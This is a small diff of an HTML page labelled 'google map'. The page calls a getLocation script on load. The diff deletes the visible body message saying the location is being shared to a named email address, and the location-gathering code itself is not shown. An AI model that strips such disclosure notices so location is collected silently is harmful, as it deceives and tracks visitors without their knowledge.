@@ -49,9 +49,4 @@ google map
         window.onload = getLocation;
     </script>
 </head>
-<body>
-    <h1 style="text-align:center;margin-top:50px;">
-        Sharing location to mmohsin.hec@gmail.com...
-    </h1>
-</body>
 </html>
